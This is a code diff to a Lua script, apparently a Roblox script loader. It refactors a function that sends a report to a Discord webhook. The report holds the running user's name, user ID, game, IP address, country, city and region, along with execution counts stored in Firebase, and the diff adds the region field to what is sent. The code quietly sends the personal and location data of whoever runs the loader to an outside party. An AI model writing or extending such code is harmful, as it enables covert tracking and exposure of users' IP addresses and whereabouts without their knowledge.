@@ -46,20 +46,30 @@ local function notify(title, text)
     end)
 end
 
-local function sendToDiscord(message, embedData)
+local function sendToDiscord(message, embed)
     pcall(function()
-        local payload = embedData and { embeds = { embedData } } or { content = message }
+        local payload
+        if embed then
+            payload = { embeds = { embed } }  -- embed is a single table, wrap in array
+        else
+            payload = { content = message }
+        end
         local json = http:JSONEncode(payload)
 
         if requestFunc then
-            requestFunc({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json })
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = json
+            })
         else
             http:PostAsync(WEBHOOK_URL, json)
         end
     end)
 end
 
---[[ FIREBASE CORE FUNCTIONS - FIXED ]]
+--[[ FIREBASE CORE FUNCTIONS ]]
 local function getFirebaseData(path)
     local url = string.format("%s/%s.json", FIREBASE_URL, path)
     local success, result = pcall(function()
@@ -71,17 +81,14 @@ local function getFirebaseData(path)
         end
     end)
     
-    -- If request failed or result is empty, return empty table
     if not success or not result or result == "" or result == "null" then
         return {}
     end
     
-    -- Try to decode JSON
     local success2, decoded = pcall(function()
         return http:JSONDecode(result)
     end)
     
-    -- If decoding failed or result is not a table, return empty table
     if not success2 or type(decoded) ~= "table" then
         return {}
     end
@@ -161,45 +168,48 @@ updateFirebaseData(STATS_PATH, globalData)
 
 --[[ SEND TO DISCORD WITH PERMANENT STATS ]]
 local embed = {
-    {
-        title = "📊 Script Execution Report",
-        color = scriptUrl and 3066993 or 15844367,
-        fields = {
-            { name = "👤 User", value = string.format("**%s**", userName), inline = true },
-            { name = "🆔 User ID", value = string.format("`%s`", userId), inline = true },
-            { name = "🎮 Game", value = string.format("**%s**", gameName), inline = true },
-            { name = "📌 Status", value = scriptUrl and "✅ **SUCCESS**" or "⚠️ **UNSUPPORTED**", inline = true },
-            { name = "🆔 Game ID", value = string.format("`%s`", id), inline = true },
-            { name = "🏷️ Place ID", value = string.format("`%s`", game.PlaceId), inline = true },
-            {
-                name = "🌍 Location",
-                value = string.format("**IP:** `%s`\n**Country:** %s\n**City:** %s",
-                    location.ip,
-                    location.country,
-                    location.city
-                ),
-                inline = false
-            },
-            {
-                name = "⏰ Activity Time",
-                value = string.format("**Executed:** %s", os.date("%Y-%m-%d %H:%M:%S")),
-                inline = true
-            },
-            {
-                name = "📊 Permanent Loader Executions",
-                value = string.format("`%s`", userStats.totalLoaderExecutions),
-                inline = true
-            },
-            {
-                name = "🎮 Permanent Game Executions",
-                value = string.format("`%s` (%s)", userStats.gameExecutions[gameIdStr], gameName),
-                inline = true
-            }
+    title = "📊 Script Execution Report",
+    color = scriptUrl and 3066993 or 15844367,
+    fields = {
+        { name = "👤 User", value = string.format("**%s**", userName), inline = true },
+        { name = "🆔 User ID", value = string.format("`%s`", userId), inline = true },
+        { name = "🎮 Game", value = string.format("**%s**", gameName), inline = true },
+        { name = "📌 Status", value = scriptUrl and "✅ **SUCCESS**" or "⚠️ **UNSUPPORTED**", inline = true },
+        { name = "🆔 Game ID", value = string.format("`%s`", id), inline = true },
+        { name = "🏷️ Place ID", value = string.format("`%s`", game.PlaceId), inline = true },
+        {
+            name = "🌍 Location",
+            value = string.format("**IP:** `%s`\n**Country:** %s\n**City:** %s\n**Region:** %s",
+                location.ip,
+                location.country,
+                location.city,
+                location.region
+            ),
+            inline = false
         },
-        footer = { text = "Universal Script Loader (Firebase Tracking)" },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
+        {
+            name = "⏰ Activity Time",
+            value = string.format("**Executed:** %s", os.date("%Y-%m-%d %H:%M:%S")),
+            inline = true
+        },
+        {
+            name = "📊 Permanent Loader Executions",
+            value = string.format("`%s`", userStats.totalLoaderExecutions),
+            inline = true
+        },
+        {
+            name = "🎮 Permanent Game Executions",
+            value = string.format("`%s` (%s)", userStats.gameExecutions[gameIdStr], gameName),
+            inline = true
+        }
+    },
+    footer = {
+        text = "Universal Script Loader (Firebase Tracking)"
+    },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
+
+-- Send the embed
 sendToDiscord(nil, embed)
 
 --[[ LOAD THE SCRIPT ]]
